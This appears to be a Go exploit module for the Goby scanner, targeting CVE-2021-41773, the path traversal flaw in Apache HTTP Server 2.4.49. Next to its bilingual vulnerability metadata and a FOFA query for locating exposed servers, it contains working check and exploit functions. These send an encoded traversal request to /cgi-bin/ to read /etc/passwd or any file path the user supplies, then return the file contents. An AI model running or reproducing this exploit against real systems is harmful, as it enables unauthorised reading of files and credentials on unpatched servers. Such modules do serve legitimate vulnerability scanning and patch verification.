package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
)

func init() {
	expJson := `{
    "Name": "Apache 2.4.49 Path Traversal (CVE-2021-41773)",
    "Description": "<p>Apache is a web server software.</p><p>A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49. An attacker could use a path traversal attack to map URLs to files outside the expected document root. If files outside of the document root are not protected by \"require all denied\" these requests can succeed. Additionally this flaw could leak the source of interpreted files like CGI scripts.</p>",
    "Impact": "Apache 2.4.49 Path Traversal (CVE-2021-41773)",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://httpd.apache.org/security/vulnerabilities_24.html\">https://httpd.apache.org/security/vulnerabilities_24.html</a></p>",
    "Product": "Apache",
    "VulType": [
        "Directory Traversal"
    ],
    "Tags": [
        "Directory Traversal"
    ],
    "Translation": {
        "CN": {
            "Name": "Apache 2.4.49版本目录穿越漏洞（CVE-2021-41773）",
            "Description": "<p>Apache是一款Web服务器软件。</p><p>在 Apache HTTP Server 2.4.49 中对路径规范化所做的更改中发现了一个缺陷。 攻击者可以使用目录穿越攻击将 URL 映射到预期文档根目录之外的文件。 如果文档根目录之外的文件不受“要求全部拒绝”的保护，则这些请求可能会成功。 此外，此缺陷可能会泄漏 CGI 脚本等解释文件的来源。</p>",
            "Impact": "<p>在 Apache HTTP Server 2.4.49 中对路径规范化所做的更改中发现了一个缺陷。 攻击者可以使用目录穿越攻击将 URL 映射到预期文档根目录之外的文件。 如果文档根目录之外的文件不受“要求全部拒绝”的保护，则这些请求可能会成功。 此外，此缺陷可能会泄漏 CGI 脚本等解释文件的来源。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新： <a href=\"https://httpd.apache.org/security/vulnerabilities_24.html\">https://httpd.apache.org/security/vulnerabilities_24.html</a></p>",
            "Product": "Apache",
            "VulType": [
                "目录遍历"
            ],
            "Tags": [
                "目录遍历"
            ]
        },
        "EN": {
            "Name": "Apache 2.4.49 Path Traversal (CVE-2021-41773)",
            "Description": "<p>Apache is a web server software.</p><p>A flaw was found in a change made to path normalization in Apache HTTP Server 2.4.49. An attacker could use a path traversal attack to map URLs to files outside the expected document root. If files outside of the document root are not protected by \"require all denied\" these requests can succeed. Additionally this flaw could leak the source of interpreted files like CGI scripts.</p>",
            "Impact": "Apache 2.4.49 Path Traversal (CVE-2021-41773)",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://httpd.apache.org/security/vulnerabilities_24.html\">https://httpd.apache.org/security/vulnerabilities_24.html</a></p>",
            "Product": "Apache",
            "VulType": [
                "Directory Traversal"
            ],
            "Tags": [
                "Directory Traversal"
            ]
        }
    },
    "FofaQuery": "banner=\"apache/2.4.49\"",
    "GobyQuery": "banner=\"apache/2.4.49\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://apache.org/",
    "DisclosureDate": "2021-10-06",
    "References": [
        "https://nvd.nist.gov/vuln/detail/CVE-2021-41773"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "9.0",
    "CVEIDs": [
        "CVE-2021-41773"
    ],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "etc/passwd",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [],
        "Support": [],
        "Service": [],
        "System": [
            "Apache"
        ],
        "Hardware": []
    },
    "PocId": "6838"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return resp.StatusCode == 200 && regexp.MustCompile("root:(x*?):0:0:").MatchString(resp.RawBody)
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["cmd"].(string)
			uri := "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/" + cmd
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					expResult.Output = resp.RawBody
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
